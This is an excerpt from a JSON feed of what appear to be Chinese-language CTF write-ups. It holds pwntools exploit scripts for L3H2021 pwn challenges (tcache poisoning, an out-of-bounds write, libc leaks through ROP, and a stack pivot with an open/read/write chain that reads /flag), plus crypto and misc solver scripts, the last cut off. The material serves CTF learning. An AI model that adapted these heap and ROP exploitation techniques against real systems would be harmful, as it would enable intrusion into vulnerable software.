alt=\"image-20230425232822379\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "title": "L3H2021 PWN部分",
            "date_published": "2021-11-29T14:47:41.000Z",
            "content_html": "<h2 id=\"spn1126\"><a class=\"anchor\" href=\"#spn1126\">#</a> spn(11.26)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc3BuLnppcA==\">附件下载</span><br />\n复现这道题的时候，我一开始用的是 0RAYS 的解法，大致是找 spn 的解密脚本，计算给出的 shell 的真实地址，然后用 tcache 打 shell，最后选 5 进 backdoor.<br />\n 虽说是读懂了 0RAYS 的脚本，而且也算是进一步学习了一下 tcache 的机制，<br />\n然而我一番搜索，着实找不到好用的 spn 解密脚本，就只好另寻出路.<br />\n0RAY 的脚本放上：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">local=<span class=\"number\">0</span></span><br><span class=\"line\">binary_name=<span class=\"string\">&#x27;SPN_ENC&#x27;</span></span><br><span class=\"line\">libc_name=<span class=\"string\">&#x27;lib/libc-2.27.so&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p=process(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p=remote(<span class=\"string\">&#x27;124.71.194.126&#x27;</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\">    e=ELF(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">z</span>(<span class=\"params\">a=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> local:</span><br><span class=\"line\">        gdb.attach(p,a)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a==<span class=\"string\">&#x27;&#x27;</span>:</span><br><span class=\"line\">            raw_input</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sd=<span class=\"keyword\">lambda</span> x:p.send(x)</span><br><span class=\"line\">sa=<span class=\"keyword\">lambda</span> a,b:p.sendafter(a,b)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class=\"line\">ia=<span class=\"keyword\">lambda</span> :p.interactive()</span><br><span class=\"line\"><span class=\"comment\"># 这里真的是学到了，不过也是我之前看大佬的wp太少的缘故，之前我还在傻傻地一个字一个字地敲(+_+)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_address</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(context.arch==<span class=\"string\">&#x27;i386&#x27;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cho</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;0.exit\\n&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,data</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sa(<span class=\"string\">&quot;Content&quot;</span>,data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor</span>():</span><br><span class=\"line\">    cho(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./spn_dec.py&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(x&amp;<span class=\"number\">0xffff</span>))</span><br><span class=\"line\">    a = <span class=\"built_in\">int</span>(io.recv()[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">    io.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">spn_dec</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    a1 = decrypt(x)</span><br><span class=\"line\">    a2 = decrypt(x&gt;&gt;<span class=\"number\">16</span>)</span><br><span class=\"line\">    a3 = decrypt(x&gt;&gt;<span class=\"number\">32</span>)</span><br><span class=\"line\">    aa = a1+a2*<span class=\"number\">0x10000</span>+a3*<span class=\"number\">0x100000000</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(a3),<span class=\"built_in\">hex</span>(a2),<span class=\"built_in\">hex</span>(a1))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(aa)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> aa</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;gift:&quot;</span>)</span><br><span class=\"line\">shell_addr=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(shell_addr))</span><br><span class=\"line\">aa = spn_dec(shell_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(aa))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x26</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(aa)[:-<span class=\"number\">2</span>])</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"string\">b&#x27;aa&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br><span class=\"line\">ia()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 害，身为菜鸡，我连脚本都没大佬写得好看</span></span><br></pre></td></tr></table></figure><br />\n 然后，我找到了另一种解法，输入 0x1000，数组越界写了 shell，可以直接 backdoor</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436358/Typera/2023/04/0a873d7de40231b015e0a70c0c4466c6.png\" alt=\"image-20230425232554399\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>+<span class=\"number\">2</span>,<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"checkin1127\"><a class=\"anchor\" href=\"#checkin1127\">#</a> checkin(11.27)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fY2hlY2tpbi56aXA=\">附件下载</span></p>\n<h3 id=\"关于asan\"><a class=\"anchor\" href=\"#关于asan\">#</a> 关于 ASan</h3>\n<p>这道题使用了 ASan，是一种影子内存的技术。关于它的具体内容可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXN0d2luZy5tZS9BU2FuLWFuZC1BU2FuLWluLUNURiUyODBjdGYtYmFieWFlZ2lzJTI5Lmh0bWw=\">这篇文章</span><br />\n这里记录一点大致的内容<br />\n ASan 是 Google 开源的一个用于进行内存检测的工具，它由两个主要部分构成，插桩和动态运行库 (Run-time library)。<br />\n插桩主要是针对在 llvm 编译器级别对访问内存的操作 (store，load，alloca 等)，将它们进行处理。<br />\n动态运行库主要提供一些运行时的复杂的功能 (比如 poison/unpoison shadow memory) 以及将 malloc,free 等系统调用函数 hook 住<br />\n ASan 采用了直接内存映射策略，具体的映射策略如下所示<br />\n<strong> 64 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x7fff8000;</p>\n</blockquote>\n<p><strong>32 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x20000000;</p>\n</blockquote>\n<h3 id=\"关于orw\"><a class=\"anchor\" href=\"#关于orw\">#</a> 关于 orw</h3>\n<p><strong>由来：</strong><br />\n有些 pwn 题为了增加难度，会在程序初始化的时候增加 seccomp 函数，禁用掉除了 sys_open,sys_write,sys_read 以外的所有系统调用。也就是说我们无法通过 system（‘/bin/sh’）来 getshell，只能通过 o，r，w 这三个系统调用获取 flag。<br />\n<strong>漏洞利用：</strong><br />\n首先调用 open 函数打开 flag 文件。<br />\n然后读取 flag 文件。<br />\n最后通过 wirte 将 flag 打印出来。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys_open(<span class=\"string\">&quot;flag&quot;</span>)//读取flag</span><br><span class=\"line\">sys_read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//rax为sysoopen的返回值，也就是flag，然后将flag写到esp下</span><br><span class=\"line\">sys_write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//打印flag的值到屏幕输出</span><br></pre></td></tr></table></figure><br />\n 害，还是知识不到位，这里再放一篇挺详细的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZWxlYWRpbmcuY29tL2FydGljbGUvNzIzMTU3MzU1MTgv\"> orw 介绍</span></p>\n<h3 id=\"分析\"><a class=\"anchor\" href=\"#分析\">#</a> 分析</h3>\n<p>pwn 内可以任意地址写一个字节，故修改 _ZN14__interception21real___isoc99_vfscanfE 的第二个字节，使其指向 gets 函数 (0x73ED28)<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436366/Typera/2023/04/38fe2a7349d7b29477d22b0f72026408.png\" alt=\"image-20230425232602805\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sla(<span class=\"string\">b&#x27;Welcome! A gift for you:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x73edb8</span>+<span class=\"number\">1</span>))</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sd(<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Leave a note.&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x1f</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&quot;That&#x27;s all. Have fun!&quot;</span>,p64(<span class=\"number\">0x43FBB3</span>))</span><br></pre></td></tr></table></figure><br />\n 构造 rop，调用 gets 函数，泄露 libc_addr 地址<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop_rdi = <span class=\"number\">0x41af0b</span></span><br><span class=\"line\">pop_rsp = <span class=\"number\">0x484d50</span></span><br><span class=\"line\">call_puts = <span class=\"number\">0x43A286</span></span><br><span class=\"line\">rop = p64(pop_rdi)+p64(<span class=\"number\">0x72DE30</span>)+p64(call_puts)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x838</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(pop_rdi)+p64(<span class=\"number\">0xA00000</span>)+p64(<span class=\"number\">0x43FBB3</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(pop_rsp)+p64(<span class=\"number\">0xA00000</span>)</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    sl(rop)</span><br><span class=\"line\">    libc_addr = leak_address()-<span class=\"number\">0x407e0</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> libc_addr == <span class=\"number\">0x736572605c61</span>:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><br />\n 最后栈迁移 + orw 调用获取 flag 文件<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binsh=libc_addr+<span class=\"number\">0x1B3E1A</span></span><br><span class=\"line\">system=libc_addr+<span class=\"number\">0x4f550</span></span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x000000000041ab7c</span></span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x000000000043ced2</span></span><br><span class=\"line\">open_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;open&#x27;</span>]</span><br><span class=\"line\">read_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">rop2 = p64(pop_rdi)+p64(<span class=\"number\">0xA00100</span>)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(open_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(read_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(write_addr)</span><br><span class=\"line\">rop2 = rop2.ljust(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+<span class=\"string\">b&#x27;/flag\\x00&#x27;</span></span><br><span class=\"line\">sl(rop2)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"slow_spn1129\"><a class=\"anchor\" href=\"#slow_spn1129\">#</a> slow_spn(11.29)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc2xvdy1zcG4uemlw\">附件下载</span><br />\n这题感觉挺奇怪的。。。<br />\n貌似除了 pwntools 工具，就没有用到啥和 pwn 相关的东西，主要的解题思路也没啥漏洞利用的感觉，大概属于密码。<br />\n程序的大概流程就是：从 flag 文件里面导出 key 和 plaintext，然后通过 s 盒和 p 盒放入 cache 里面.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436377/Typera/2023/04/d98248de6bbcdd6c0a8ae6fa6d3523de.png\" alt=\"image-20230425232612526\" /><br />\ncache 是题目实现的，最多可以往里添加 0x20 个数（模拟访问 s 盒中的地址），超过了会剔除最小的一个，若是 cache 命中了则使用算法计数，未命中则 sleep (1)，<br />\n由于题目给了一次访问 plaintext 在 s 盒中的地址的机会，所以可以通过遍历来爆破，通过 sleep (1) 判断 cache 是否命中，然后推出上图中 p，v9，v7，v5 以及 k&gt;&gt;8，k&gt;&gt;4，k 的值，然后拼接得到 key.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436385/Typera/2023/04/f5836a7db5ff249e037d1a839c975876.png\" alt=\"image-20230425232621850\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "title": "2021-羊城杯_wp",
            "date_published": "2021-11-26T10:21:00.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"crypto-ringringring\"><a class=\"anchor\" href=\"#crypto-ringringring\">#</a> Crypto-RingRingRing</h2>\n<p>连上后先是让我们输验证码，MD5，这个没什么好说的，爆破一下就出了。<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR1.png\" alt=\"\" /><br />\n然后让我们给出满足条件<br />\n <code>a**4 + b**4 + c**4 + d**4 = e**2</code> <br />\n 的 100 个 a,b,c,d,e<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR2.png\" alt=\"\" /><br />\n 依旧是爆破，判断 <code>sqrt(a**4 + b**4 + c**4 + d**4)</code>  的值为整数时，依次输出 a,b,c,d,e 就可以了，输出 100 个之后返回就可以得到 flag<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR3.png\" alt=\"\" /></p>\n<pre><code>from pwn import*\nfrom math import sqrt\nr=remote('192.168.39.25',2378)\ndef myhash(text):\n\tmysha = hashlib.md5()\n\tmysha.update(text)\n\treturn mysha.hexdigest()\n\ndef passPoW(plain, cipher):\n\tdic = string.digits+string.ascii_letters\n\tfor a0 in dic:\n\t\tfor a1 in dic:\n\t\t\tfor a2 in dic:\n\t\t\t\tfor a3 in dic:\n\t\t\t\t\tfor a4 in dic:\n\t\t\t\t\t\ttmp = bytes((str(a0)+str(a1)+str(a2)+str(a3)+str(a4)+str(plain)).encode())\n\t\t\t\t\t\tif(myhash(tmp)[0:5]==cipher):\n\t\t\t\t\t\t\treturn str(a0)+str(a1)+str(a2)+str(a3)+str(a4)\n\ndef q1():\n\tnum=0\n\tfor a in range(1,100):\n\t\tfor b in range(1,100):\n\t\t\tfor c in range(1,100):\n\t\t\t\tfor d in range(1,100):\n\t\t\t\t\tif(sqrt(a**4 + b**4 + c**4 + d**4)%1==0):\n\t\t\t\t\t\tprint(r.recvuntil('a:').decode())\n\t\t\t\t\t\tr.send(bytes(str(a).encode()))\n\t\t\t\t\t\t#print(bytes(str(a).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('b:').decode())\n\t\t\t\t\t\tr.send(bytes(str(b).encode()))\n\t\t\t\t\t\t#print(bytes(str(b).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('c:').decode())\n\t\t\t\t\t\tr.send(bytes(str(c).encode()))\n\t\t\t\t\t\t#print(bytes(str(c).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('d:').decode())\n\t\t\t\t\t\tr.send(bytes(str(d).encode()))\n\t\t\t\t\t\t#print(bytes(str(d).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('e:').decode())\n\t\t\t\t\t\tr.send(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\t#print(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\tprint(r.recvline())\n\t\t\t\t\t\tnum+=1\n\t\t\t\t\t\tprint(num)\n\t\t\t\t\t\tif(num == 100):\n\t\t\t\t\t\t\treturn\n\nst = r.recvuntil(b'\\n')\nprint(st.decode())\nplain = st[36:40].decode()\nprint(plain)\ncipher = st[50:-1].decode()\nprint(cipher)\nres = passPoW(plain, cipher)\nprint(res)\nprint(r.recv().decode())\nr.sendline(res.encode())\nq1()\nr.interactive()\n</code></pre>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "title": "2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp",
            "date_published": "2021-11-26T10:20:21.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"misc-red_vs_blue\"><a class=\"anchor\" href=\"#misc-red_vs_blue\">#</a> Misc-red_vs_blue</h2>\n<p>简单来说就是 66 轮试错，同一次 nc 里面的答案是一样的，要么输入 r, 要么输入 b，错了就输入 y 重来，因为有时间限制，只能上脚本（本来还想手搓）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sh=process(&quot;./buu--rip&quot;)  local端</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>, <span class=\"number\">28699</span>)</span><br><span class=\"line\">s = []</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">tag=<span 